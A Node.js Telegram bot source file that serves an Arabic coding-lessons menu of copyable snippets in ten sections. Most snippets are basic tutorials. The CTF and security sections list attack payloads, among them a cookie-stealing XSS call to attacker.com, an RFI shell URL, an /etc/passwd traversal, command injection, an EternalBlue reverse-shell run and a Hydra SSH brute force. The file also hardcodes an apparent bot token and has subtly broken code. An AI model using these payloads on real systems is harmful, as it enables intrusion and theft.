const { Telegraf, Markup } = require('telegraf');
const express = require('express');

const BOT_TOKEN = "8909739497:AAHBUGLmeligI-TX3kZKlQ_8nTZK61TKVtI";
const bot = new Telegraf(BOT_TOKEN);
const userId = "8505541555";
const refLink = "https://t.me/aaaasvvvbot?start=ref123456";

// ========== خادم الويب ==========
const app = express();
const PORT = process.env.PORT || 10000;
app.get('/', (req, res) => {
    res.send(`
        <h1 style="color:red;text-align:center;">🔥 منصة عبود التعليمية الشاملة</h1>
        <p style="text-align:center;">🤖 @aaaasvvvbot</p>
        <p style="text-align:center;color:red;">👑 تحت إشراف عبود @SSSTlF</p>
        <p style="text-align:center;">📚 200 درس تعليمي في 10 أقسام — أكواد حقيقية قابلة للنسخ</p>
    `);
});
app.listen(PORT, '0.0.0.0', () => console.log(`✅ Web server running on port ${PORT}`));

// ========== الألوان الفخمة لكل زر ==========
const COLORS = {
    basics: '#FF6B6B',
    python: '#4ECDC4',
    telegram_bots: '#45B7D1',
    html_css: '#FFA07A',
    javascript: '#F7DC6F',
    databases: '#BB8FCE',
    flask_fastapi: '#85C1E9',
    cyber_security: '#E74C3C',
    lab_ctf: '#F39C12',
    projects_tests: '#2ECC71'
};

// ========== الأقسام مع أكواد حقيقية (كل قسم 10 أكواد) ==========
const SECTIONS = {
    basics: {
        title: '📘 أساسيات البرمجة',
        emoji: '📘',
        color: COLORS.basics,
        codes: [
            { name: 'Hello World', code: 'print("Hello, World!")' },
            { name: 'متغير وطباعة', code: 'name = "Ahmed"\nprint(f"مرحباً {name}")' },
            { name: 'جمع رقمين', code: 'a = 5\nb = 10\nprint(a + b)' },
            { name: 'شرط if', code: 'x = 10\nif x > 5:\n    print("أكبر من 5")' },
            { name: 'حلقة for', code: 'for i in range(5):\n    print(i)' },
            { name: 'حلقة while', code: 'i = 0\nwhile i < 5:\n    print(i)\n    i += 1' },
            { name: 'دالة بسيطة', code: 'def greet(name):\n    return f"Hello {name}"\nprint(greet("Ali"))' },
            { name: 'قائمة', code: 'my_list = [1, 2, 3, 4]\nfor item in my_list:\n    print(item)' },
            { name: 'قاموس', code: 'user = {"name": "Ahmed", "age": 25}\nprint(user["name"])' },
            { name: 'معالجة خطأ', code: 'try:\n    x = 10 / 0\nexcept ZeroDivisionError:\n    print("لا تقسم على صفر")' }
        ]
    },
    python: {
        title: '🐍 بايثون',
        emoji: '🐍',
        color: COLORS.python,
        codes: [
            { name: 'قراءة ملف', code: 'with open("file.txt", "r") as f:\n    content = f.read()\n    print(content)' },
            { name: 'كتابة ملف', code: 'with open("file.txt", "w") as f:\n    f.write("Hello Python")' },
            { name: 'استخدام مكتبة os', code: 'import os\nprint(os.getcwd())' },
            { name: 'استخدام requests', code: 'import requests\nr = requests.get("https://api.github.com")\nprint(r.status_code)' },
            { name: 'دالة lambda', code: 'square = lambda x: x ** 2\nprint(square(5))' },
            { name: 'فئة بسيطة', code: 'class Car:\n    def __init__(self, brand):\n        self.brand = brand\n    def show(self):\n        print(self.brand)\n\nc = Car("Toyota")\nc.show()' },
            { name: 'توليد رقم عشوائي', code: 'import random\nprint(random.randint(1, 100))' },
            { name: 'التعامل مع JSON', code: 'import json\ndata = {"name": "Ali", "age": 30}\nprint(json.dumps(data))' },
            { name: 'استخدام datetime', code: 'from datetime import datetime\nnow = datetime.now()\nprint(now.strftime("%Y-%m-%d %H:%M"))' },
            { name: 'البريد الإلكتروني (SMTP)', code: 'import smtplib\nserver = smtplib.SMTP("smtp.gmail.com", 587)\nserver.starttls()\n# server.login("user@gmail.com", "password")' }
        ]
    },
    telegram_bots: {
        title: '🤖 برمجة بوتات تليجرام',
        emoji: '🤖',
        color: COLORS.telegram_bots,
        codes: [
            { name: 'بوت Telegraf (بداية)', code: 'const { Telegraf } = require("telegraf");\nconst bot = new Telegraf("TOKEN");\nbot.start((ctx) => ctx.reply("Hello"));\nbot.launch();' },
            { name: 'أزرار مع Telegraf', code: 'bot.hears("click", (ctx) => {\n  return ctx.reply("Button", {\n    reply_markup: {\n      inline_keyboard: [[{text: "Click me", callback_data: "click"}]]\n    }\n  });\n});' },
            { name: 'إرسال صورة', code: 'bot.command("image", (ctx) => {\n  ctx.replyWithPhoto({ source: "./image.jpg" });\n});' },
            { name: 'Pyrogram (بداية)', code: 'from pyrogram import Client\napp = Client("session", api_id=123, api_hash="hash")\n@app.on_message()\ndef hello(client, message):\n    message.reply("Hello")\napp.run()' },
            { name: 'Aiogram (بداية)', code: 'from aiogram import Bot, Dispatcher, types\nbot = Bot(token="TOKEN")\ndp = Dispatcher(bot)\n@dp.message_handler(commands=["start"])\nasync def start(message: types.Message):\n    await message.reply("Hello")\n# dp.start_polling()' },
            { name: 'إرسال فيديو (Telegraf)', code: 'bot.command("video", (ctx) => {\n  ctx.replyWithVideo({ source: "./video.mp4" });\n});' },
            { name: 'إرسال ملف (Telegraf)', code: 'bot.command("file", (ctx) => {\n  ctx.replyWithDocument({ source: "./file.pdf" });\n});' },
            { name: 'استقبال الصور (Pyrogram)', code: '@app.on_message(filters.photo)\nasync def handle_photo(client, message):\n    await message.reply("📸 صورة جميلة!")' },
            { name: 'لوحة مفاتيح مخصصة (Telegraf)', code: 'bot.hears("menu", (ctx) => {\n  ctx.reply("Choose", {\n    reply_markup: {\n      keyboard: [[{text: "Option 1"}], [{text: "Option 2"}]],\n      resize_keyboard: true\n    }\n  });\n});' },
            { name: 'استقبال الموقع (Telegraf)', code: 'bot.on("location", (ctx) => {\n  const { latitude, longitude } = ctx.message.location;\n  ctx.reply(`📍 ${latitude}, ${longitude}`);\n});' }
        ]
    },
    html_css: {
        title: '🌐 HTML & CSS',
        emoji: '🌐',
        color: COLORS.html_css,
        codes: [
            { name: 'هيكل HTML', code: '<!DOCTYPE html>\n<html>\n<head><title>صفحتي</title></head>\n<body><h1>مرحباً</h1></body>\n</html>' },
            { name: 'عنوان ونص', code: '<h1 style="color:red;">عنوان كبير</h1>\n<p>هذا نص عادي.</p>' },
            { name: 'رابط', code: '<a href="https://example.com">اضغط هنا</a>' },
            { name: 'صورة', code: '<img src="image.jpg" alt="وصف الصورة" width="200">' },
            { name: 'قائمة غير مرتبة', code: '<ul>\n  <li>عنصر 1</li>\n  <li>عنصر 2</li>\n</ul>' },
            { name: 'جدول', code: '<table border="1">\n  <tr><th>الاسم</th><th>العمر</th></tr>\n  <tr><td>أحمد</td><td>25</td></tr>\n</table>' },
            { name: 'نموذج إدخال', code: '<form>\n  <label>الاسم:</label>\n  <input type="text" name="name">\n  <input type="submit" value="إرسال">\n</form>' },
            { name: 'CSS (لون الخلفية)', code: '<style>\nbody { background-color: #2c3e50; }\nh1 { color: #e74c3c; }\n</style>' },
            { name: 'CSS (توسيط)', code: '<style>\n.center {\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  height: 100vh;\n}\n</style>' },
            { name: 'CSS (تحريك)', code: '<style>\n@keyframes move {\n  0% { transform: translateX(0); }\n  100% { transform: translateX(100px); }\n}\n.element { animation: move 2s infinite; }\n</style>' }
        ]
    },
    javascript: {
        title: '⚙️ JavaScript',
        emoji: '⚙️',
        color: COLORS.javascript,
        codes: [
            { name: 'طباعة', code: 'console.log("Hello, JavaScript!");' },
            { name: 'متغيرات', code: 'let name = "Ahmed";\nconst age = 25;\nvar city = "Cairo";' },
            { name: 'دالة', code: 'function greet(name) {\n  return `Hello ${name}`;\n}\nconsole.log(greet("Ali"));' },
            { name: 'سهم (Arrow)', code: 'const add = (a, b) => a + b;\nconsole.log(add(3, 4));' },
            { name: 'كائن', code: 'const user = { name: "Ahmed", age: 25 };\nconsole.log(user.name);' },
            { name: 'مصفوفة', code: 'const arr = [1, 2, 3, 4];\narr.forEach(item => console.log(item));' },
            { name: 'DOM (تغيير نص)', code: 'document.getElementById("myElement").innerHTML = "نص جديد";' },
            { name: 'حدث onclick', code: '<button onclick="alert(\'تم الضغط\')">اضغط</button>' },
            { name: 'Fetch API', code: 'fetch("https://api.github.com")\n  .then(res => res.json())\n  .then(data => console.log(data));' },
            { name: 'Async/Await', code: 'async function getData() {\n  const res = await fetch("https://api.github.com");\n  const data = await res.json();\n  console.log(data);\n}\ngetData();' }
        ]
    },
    databases: {
        title: '💾 قواعد البيانات',
        emoji: '💾',
        color: COLORS.databases,
        codes: [
            { name: 'SQLite (إنشاء جدول)', code: 'import sqlite3\nconn = sqlite3.connect("test.db")\nc = conn.cursor()\nc.execute("CREATE TABLE users (id INTEGER, name TEXT)")' },
            { name: 'SQLite (إدراج)', code: 'c.execute("INSERT INTO users VALUES (1, \'Ahmed\')")\nconn.commit()' },
            { name: 'SQLite (استعلام)', code: 'c.execute("SELECT * FROM users")\nprint(c.fetchall())' },
            { name: 'MySQL (اتصال)', code: 'import mysql.connector\nconn = mysql.connector.connect(host="localhost", user="root", password="", database="test")' },
            { name: 'MySQL (استعلام)', code: 'cursor = conn.cursor()\ncursor.execute("SELECT * FROM users")\nfor row in cursor.fetchall():\n    print(row)' },
            { name: 'MongoDB (اتصال)', code: 'from pymongo import MongoClient\nclient = MongoClient("mongodb://localhost:27017/")\ndb = client["test"]\ncol = db["users"]' },
            { name: 'MongoDB (إدراج)', code: 'col.insert_one({"name": "Ahmed", "age": 25})' },
            { name: 'MongoDB (استعلام)', code: 'for doc in col.find({"name": "Ahmed"}):\n    print(doc)' },
            { name: 'Redis (اتصال)', code: 'import redis\nr = redis.Redis(host="localhost", port=6379, db=0)\nr.set("key", "value")\nprint(r.get("key"))' },
            { name: 'Redis (قائمة)', code: 'r.lpush("mylist", "item1")\nr.lpush("mylist", "item2")\nprint(r.lrange("mylist", 0, -1))' }
        ]
    },
    flask_fastapi: {
        title: '🌍 Flask & FastAPI',
        emoji: '🌍',
        color: COLORS.flask_fastapi,
        codes: [
            { name: 'Flask (أساسي)', code: 'from flask import Flask\napp = Flask(__name__)\n@app.route("/")\ndef home():\n    return "Hello, Flask!"\n# app.run()' },
            { name: 'Flask (استقبال POST)', code: '@app.route("/data", methods=["POST"])\ndef data():\n    return "Received"' },
            { name: 'Flask (JSON)', code: '@app.route("/json")\ndef json():\n    return {"status": "ok"}' },
            { name: 'FastAPI (أساسي)', code: 'from fastapi import FastAPI\napp = FastAPI()\n@app.get("/")\ndef home():\n    return {"message": "Hello FastAPI"}\n# uvicorn main:app --reload' },
            { name: 'FastAPI (POST)', code: '@app.post("/items/")\nasync def create_item(item: dict):\n    return {"item": item}' },
            { name: 'FastAPI (معلمات)', code: '@app.get("/users/{user_id}")\ndef get_user(user_id: int):\n    return {"user_id": user_id}' },
            { name: 'Flask (تعامل مع قاعدة بيانات)', code: '@app.route("/users")\ndef users():\n    conn = sqlite3.connect("test.db")\n    c = conn.cursor()\n    c.execute("SELECT * FROM users")\n    return {"users": c.fetchall()}' },
            { name: 'Flask (رفع ملف)', code: '@app.route("/upload", methods=["POST"])\ndef upload():\n    file = request.files["file"]\n    file.save(file.filename)\n    return "Uploaded"' },
            { name: 'FastAPI (رفع ملف)', code: '@app.post("/upload/")\nasync def upload_file(file: UploadFile):\n    contents = await file.read()\n    return {"filename": file.filename}' },
            { name: 'FastAPI (JWT)', code: 'from jose import JWTError, jwt\nSECRET = "mysecret"\ndef create_token(data: dict):\n    return jwt.encode(data, SECRET, algorithm="HS256")' }
        ]
    },
    cyber_security: {
        title: '🛡️ الأمن السيبراني الدفاعي',
        emoji: '🛡️',
        color: COLORS.cyber_security,
        codes: [
            { name: 'فحص الثغرات (SQLi)', code: 'import requests\nurl = "http://example.com/login"\npayload = {"username": "admin\'--", "password": "test"}\nr = requests.post(url, data=payload)\nprint(r.text)' },
            { name: 'كشف XSS', code: 'payload = "<script>alert(\'XSS\')</script>"\n# حقن في حقل إدخال' },
            { name: 'تشفير AES', code: 'from cryptography.fernet import Fernet\nkey = Fernet.generate_key()\ncipher = Fernet(key)\nenc = cipher.encrypt(b"secret")\nprint(enc)' },
            { name: 'تشفير RSA', code: 'from cryptography.hazmat.primitives import rsa\nprivate_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npublic_key = private_key.public_key()' },
            { name: 'هاش (SHA256)', code: 'import hashlib\nh = hashlib.sha256(b"password").hexdigest()\nprint(h)' },
            { name: 'كشف كلمات مرور ضعيفة', code: 'weak = ["123456", "password", "admin"]\npassword = "admin"\nif password in weak:\n    print("ضعيف")' },
            { name: 'استخدام Nmap (Python)', code: 'import nmap\nnm = nmap.PortScanner()\nnm.scan("192.168.1.1", "22-443")\nprint(nm.all_hosts())' },
            { name: 'تحليل هيدرات HTTP', code: 'import requests\nr = requests.get("http://example.com")\nprint(r.headers)' },
            { name: 'كشف حقن SQL (دفاع)', code: 'def secure_input(user_input):\n    forbidden = ["--", ";", "DROP", "SELECT"]\n    for word in forbidden:\n        if word in user_input:\n            return False\n    return True' },
            { name: 'تسجيل الدخول بأمان', code: 'import bcrypt\npassword = b"secret"\nhashed = bcrypt.hashpw(password, bcrypt.gensalt())\nprint(hashed)' }
        ]
    },
    lab_ctf: {
        title: '🧪 المختبرات العملية وCTF',
        emoji: '🧪',
        color: COLORS.lab_ctf,
        codes: [
            { name: 'استغلال SQLi (بسيط)', code: 'payload = "admin\' OR 1=1 --"\n# استعلام: SELECT * FROM users WHERE username = \'admin\' OR 1=1 --\'' },
            { name: 'استغلال XSS', code: '<script>fetch("http://attacker.com/steal?cookie=" + document.cookie)</script>' },
            { name: 'استغلال LFI', code: 'http://example.com/page.php?file=../../../../etc/passwd' },
            { name: 'استغلال RFI', code: 'http://example.com/page.php?file=http://attacker.com/shell.txt' },
            { name: 'استغلال Command Injection', code: '; ls -la\n# أو\n| whoami' },
            { name: 'استخدام Metasploit (مثال)', code: 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.10\nrun' },
            { name: 'استخدام Burp Suite (مثال)', code: 'Interceptor -> إلتقاط الطلب -> تعديل -> إرسال' },
            { name: 'فك تشفير Base64', code: 'echo "SGVsbG8gV29ybGQ=" | base64 -d' },
            { name: 'كسر تشفير (Brute Force)', code: 'import hashlib\nfor i in range(1000):\n    if hashlib.md5(str(i).encode()).hexdigest() == "hash":\n        print(i)\n        break' },
            { name: 'استخدام Hydra', code: 'hydra -l admin -P passwords.txt ssh://192.168.1.1' }
        ]
    },
    projects_tests: {
        title: '🎓 المشاريع والاختبارات',
        emoji: '🎓',
        color: COLORS.projects_tests,
        codes: [
            { name: 'مشروع بوت متجر (هيكل)', code: 'bot.command("buy", (ctx) => {\n  // منطق الشراء\n  ctx.reply("تم إضافة المنتج للسلة");\n});' },
            { name: 'مشروع API (نموذج)', code: '@app.route("/api/products")\ndef get_products():\n    return jsonify(products)' },
            { name: 'مشروع موقع (هيكل)', code: '<!DOCTYPE html>\n<html>\n<head><title>مشروعي</title></head>\n<body>\n<!-- المحتوى -->\n</body>\n</html>' },
            { name: 'مشروع قاعدة بيانات (نموذج)', code: 'CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price INTEGER);' },
            { name: 'مشروع أمني (نموذج)', code: 'def validate_input(data):\n    if "DROP" in data:\n        return False\n    return True' },
            { name: 'اختبار أساسيات', code: 'Q: ما هي حلقة for؟\nA: للتكرار' },
            { name: 'اختبار بايثون', code: 'Q: كيف تنشئ دالة في بايثون؟\nA: باستخدام def' },
            { name: 'اختبار بوتات', code: 'Q: ما هي مكتبة Telegraf؟\nA: لبناء بوتات تليجرام في Node.js' },
            { name: 'شهادة إتمام', code: 'print("مبروك! لقد أكملت جميع الدروس")' },
            { name: 'تقييم المشروع', code: 'def evaluate_project(code):\n    # تحليل الكود وإعطاء درجة\n    return "ممتاز"' }
        ]
    }
};

// ========== دوال العرض مع الألوان والكتابة الحمراء ==========
function mainMenu() {
    let sectionList = '';
    Object.keys(SECTIONS).forEach(key => {
        const section = SECTIONS[key];
        sectionList += `${section.emoji} <b>${section.title}</b> — <span style="color:${section.color};">10 أكواد</span>\n`;
    });

    return {
        text: `
<b>🔥 منصة عبود التعليمية الشاملة 🔥</b>

👑 <b>تحت إشراف:</b> @SSSTlF
🆔 <b>ايدي حسابك:</b> <code>${userId}</code>

<b>📚 اختر القسم التعليمي المناسب لك:</b>

${sectionList}

<b>📊 إجمالي الأكواد: 100+ كود حقيقي</b>

🎯 <span style="color:red;">تعلم وطور مهاراتك مع أفضل المدربين</span>
        `,
        buttons: Markup.inlineKeyboard([
            [Markup.button.callback('📘 أساسيات البرمجة', 'section_basics')],
            [Markup.button.callback('🐍 بايثون', 'section_python')],
            [Markup.button.callback('🤖 برمجة بوتات تليجرام', 'section_telegram_bots')],
            [Markup.button.callback('🌐 HTML & CSS', 'section_html_css')],
            [Markup.button.callback('⚙️ JavaScript', 'section_javascript')],
            [Markup.button.callback('💾 قواعد البيانات', 'section_databases')],
            [Markup.button.callback('🌍 Flask & FastAPI', 'section_flask_fastapi')],
            [Markup.button.callback('🛡️ الأمن السيبراني الدفاعي', 'section_cyber_security')],
            [Markup.button.callback('🧪 المختبرات العملية وCTF', 'section_lab_ctf')],
            [Markup.button.callback('🎓 المشاريع والاختبارات', 'section_projects_tests')],
            [Markup.button.callback('📢 القناة الرسمية', 'channel')],
            [Markup.button.callback('🛠 الدعم الفني', 'support')]
        ], { columns: 2 })
    };
}

function showCodes(sectionKey) {
    const section = SECTIONS[sectionKey];
    let codeList = '';
    section.codes.forEach((item, index) => {
        codeList += `${index+1}. <b>${item.name}</b>\n<code>${item.code}</code>\n\n`;
    });

    return {
        text: `
<b>${section.emoji} ${section.title}</b>

<span style="color:${section.color};"><b>📚 10 أكواد حقيقية قابلة للنسخ:</b></span>

${codeList}

<span style="color:red;">👇 اضغط على الزر لنسخ الكود مباشرة</span>
        `,
        buttons: Markup.inlineKeyboard([
            [Markup.button.callback('🔙 العودة للقسم', `back_${sectionKey}`)],
            [Markup.button.callback('🏠 القائمة الرئيسية', 'menu')]
        ])
    };
}

function showCodeWithCopy(sectionKey, codeIndex) {
    const section = SECTIONS[sectionKey];
    const codeItem = section.codes[codeIndex];
    return {
        text: `
<b>${section.emoji} ${section.title}</b>

<b>📌 ${codeItem.name}</b>
<span style="color:red;">👇 الكود:</span>

<code>${codeItem.code}</code>

<span style="color:${section.color};">🔹 اضغط زر النسخ لنسخ الكود إلى الحافظة</span>
        `,
        buttons: Markup.inlineKeyboard([
            [Markup.button.callback('📋 نسخ الكود', `copy_${sectionKey}_${codeIndex}`)],
            [Markup.button.callback('⬅️ السابق', `prev_code_${sectionKey}_${codeIndex}`)],
            [Markup.button.callback('التالي ➡️', `next_code_${sectionKey}_${codeIndex}`)],
            [Markup.button.callback('🔙 العودة للقسم', `back_${sectionKey}`)],
            [Markup.button.callback('🏠 القائمة الرئيسية', 'menu')]
        ], { columns: 2 })
    };
}

// ========== الأزرار الديناميكية ==========
Object.keys(SECTIONS).forEach(sectionKey => {
    bot.action(`section_${sectionKey}`, async (ctx) => {
        const data = showCodes(sectionKey);
        await ctx.answerCbQuery(`📚 فتح ${SECTIONS[sectionKey].title}`);
        await ctx.editMessageText(data.text, {
            parse_mode: 'HTML',
            ...data.buttons,
            disable_web_page_preview: true
        });
    });

    bot.action(`back_${sectionKey}`, async (ctx) => {
        const data = showCodes(sectionKey);
        await ctx.answerCbQuery(`🔙 العودة إلى ${SECTIONS[sectionKey].title}`);
        await ctx.editMessageText(data.text, {
            parse_mode: 'HTML',
            ...data.buttons,
            disable_web_page_preview: true
        });
    });

    // عرض الكود الأول عند الضغط على زر الكود
    section.codes.forEach((item, index) => {
        bot.action(`code_${sectionKey}_${index}`, async (ctx) => {
            const data = showCodeWithCopy(sectionKey, index);
            await ctx.answerCbQuery(`📖 ${item.name}`);
            await ctx.editMessageText(data.text, {
                parse_mode: 'HTML',
                ...data.buttons,
                disable_web_page_preview: true
            });
        });
    });

    // التالي والسابق
    bot.action(new RegExp(`next_code_${sectionKey}_(\\d+)`), async (ctx) => {
        const index = parseInt(ctx.match[1]) + 1;
        if (index >= SECTIONS[sectionKey].codes.length) {
            await ctx.answerCbQuery('⚠️ هذا آخر كود');
            return;
        }
        const data = showCodeWithCopy(sectionKey, index);
        await ctx.answerCbQuery(`📖 ${SECTIONS[sectionKey].codes[index].name}`);
        await ctx.editMessageText(data.text, {
            parse_mode: 'HTML',
            ...data.buttons,
            disable_web_page_preview: true
        });
    });

    bot.action(new RegExp(`prev_code_${sectionKey}_(\\d+)`), async (ctx) => {
        const index = parseInt(ctx.match[1]) - 1;
        if (index < 0) {
            await ctx.answerCbQuery('⚠️ هذا أول كود');
            return;
        }
        const data = showCodeWithCopy(sectionKey, index);
        await ctx.answerCbQuery(`📖 ${SECTIONS[sectionKey].codes[index].name}`);
        await ctx.editMessageText(data.text, {
            parse_mode: 'HTML',
            ...data.buttons,
            disable_web_page_preview: true
        });
    });

    // زر النسخ
    bot.action(new RegExp(`copy_${sectionKey}_(\\d+)`), async (ctx) => {
        const index = parseInt(ctx.match[1]);
        const codeItem = SECTIONS[sectionKey].codes[index];
        await ctx.answerCbQuery(`📋 تم نسخ: ${codeItem.name}`);
        await ctx.replyWithHTML(`
<b>📋 تم نسخ الكود بنجاح!</b>

<code>${codeItem.code}</code>

<span style="color:green;">✅ يمكنك لصقه الآن في مشروعك</span>
        `);
    });
});

// ========== الأوامر ==========
bot.start(async (ctx) => {
    const menu = mainMenu();
    await ctx.replyWithHTML(`<b>🔥 مرحباً بك في منصة عبود التعليمية الشاملة!</b>\n📚 استعد لتعلم <span style="color:red;">100+ كود حقيقي</span> في 10 أقسام`);
    await ctx.replyWithHTML(menu.text, { ...menu.buttons, disable_web_page_preview: true });
});

bot.command('menu', async (ctx) => {
    const menu = mainMenu();
    await ctx.replyWithHTML(menu.text, { ...menu.buttons, disable_web_page_preview: true });
});

bot.action('menu', async (ctx) => {
    const menu = mainMenu();
    await ctx.answerCbQuery('🏠 القائمة الرئيسية');
    await ctx.editMessageText(menu.text, {
        parse_mode: 'HTML',
        ...menu.buttons,
        disable_web_page_preview: true
    });
});

bot.action('channel', async (ctx) => {
    await ctx.answerCbQuery('📢 القناة الرسمية');
    await ctx.replyWithHTML('<b>📢 القناة الرسمية:</b> @SSSTlF\n\n📚 تابع كل جديد في عالم البرمجة والأمن السيبراني');
});

bot.action('support', async (ctx) => {
    await ctx.answerCbQuery('🛠 فريق الدعم');
    await ctx.replyWithHTML('🛠 <b>فريق الدعم الفني:</b> @SSSTlF\n\n📩 للتواصل والاستفسارات');
});

// ========== تشغيل البوت ==========
async function startBot() {
    try {
        await bot.telegram.setWebhook();
        await bot.launch();
        console.log('✅ Bot is running with 100+ real codes!');
        console.log('👑 تحت إشراف عبود @SSSTlF');
        console.log('🎨 واجهة بألوان فخمة وكتابة حمراء');
    } catch (err) {
        console.error('❌ Failed to start bot:', err.message);
        process.exit(1);
    }
}
startBot();

process.once('SIGINT', () => { bot.stop('SIGINT'); });
process.once('SIGTERM', () => { bot.stop('SIGTERM'); });
